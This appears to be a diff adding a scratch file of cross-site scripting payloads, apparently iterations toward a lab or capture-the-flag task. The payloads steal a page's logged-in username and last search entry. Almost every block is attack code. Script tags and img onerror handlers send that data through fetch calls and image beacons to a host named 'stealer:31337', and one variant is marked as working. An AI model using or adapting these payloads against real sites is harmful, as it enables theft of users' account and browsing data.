@@ -1,0 +1,94 @@
+----------------------get username, get last search
+
+<script>
+        alert(document.getElementById("logged-in-user").innerText);
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    (function(){
+        alert(document.getElementsByClassName("history-item list-group-item list-group-item-action text-break").item(1).innerText);
+    })();
+});
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    (function(){
+        alert(document.getElementsByClassName("history-item list-group-item list-group-item-action text-break").item(1).innerText
+        , document.getElementById("logged-in-user").innerText);
+    })();
+});
+</script>
+
+--------------------2.0
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    (function(){
+fetch('http://stealer:31337/?stolen_user=' + encodeURIComponent(document.getElementById("logged-in-user").innerText) + '&last_search=' + encodeURIComponent(document.getElementsByClassName("history-item list-group-item list-group-item-action text-break").item(1).innerText))
+  .then(response => console.log('Data sent successfully'))
+  .catch(error => console.error('Error:', error));
+  })();
+});
+</script>
+
+(document).ready(function() {
+fetch('http://stealer:31337/?stolen_user=' + encodeURIComponent(document.getElementById("logged-in-user").innerText) + '&last_search=' + encodeURIComponent(document.getElementsByClassName("history-item list-group-item list-group-item-action text-break").item(1).innerText))
+  .then(response => console.log('Data sent successfully'))
+  .catch(error => console.error('Error:', error));
+});
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    (function(){
+    var username = document.getElementById("logged-in-user").innerText;
+    var lastSearch = document.getElementsByClassName("history-item list-group-item list-group-item-action text-break").item(1).innerText;
+
+    var img = new Image();
+    img.src = 'http://stealer:31337/?stolen_user=' + encodeURIComponent(username) + '&last_search=' + encodeURIComponent(lastSearch);
+  })();
+});
+</script>
+
+--------------------2.1
+
+<img src=x onerror='document.addEventListener("DOMContentLoaded", function() {
+    (function(){
+        alert(document.getElementById("logged-in-user").innerText)  })();
+});'>
+
+
+<img src=x onerror='document.addEventListener("DOMContentLoaded", function() {
+    (function(){
+        alert(document.getElementsByClassName("history-item list-group-item list-group-item-action text-break").item(1).innerText);
+    })();
+});'>
+
+<img src=x onerror="document.addEventListener('DOMContentLoaded', function() {(function(){var username = document.getElementById('logged-in-user').innerText; var lastSearch = document.getElementsByClassName('history-item list-group-item list-group-item-action text-break').item(1).innerText; var img=new Image(); img.src='http://stealer:31337/?stolen_user='+encodeURIComponent(username)+'&last_search='+encodeURIComponent(lastSearch);})();});">
+
+<img src=x onerror='document.addEventListener("DOMContentLoaded", function() {
+    (function(){
+    var username = document.getElementById("logged-in-user").innerText;
+    var lastSearch = document.getElementsByClassName("history-item list-group-item list-group-item-action text-break").item(1).innerText;
+    var img = new Image();
+    img.src = 'http://stealer:31337/?stolen_user=' + encodeURIComponent(username) + '&last_search=' + encodeURIComponent(lastSearch);
+  })();
+});'>
+
+
+<img src=x onerror='document.addEventListener("DOMContentLoaded", function() {
+    (function(){
+    var username = document.getElementById("logged-in-user").innerText;
+    var lastSearch = document.getElementsByClassName("history-item list-group-item list-group-item-action text-break").item(1).innerText;
+    var img = new Image();
+    img.src = "http://stealer:31337/?stolen_user=" + encodeURIComponent(username) + "&last_search=" + encodeURIComponent(lastSearch);
+  })();
+});'>
+
+--works
+<img src=x onerror=" var lastSearch = document.getElementsByClassName('history-item list-group-item list-group-item-action text-break').item(1).innerText; if(lastSearch)
+fetch('http://stealer:31337/?stolen_user=' + encodeURIComponent(document.getElementById('logged-in-user').innerText) + '&last_search=' + encodeURIComponent(lastSearch));
+">
+
+
+------2.2
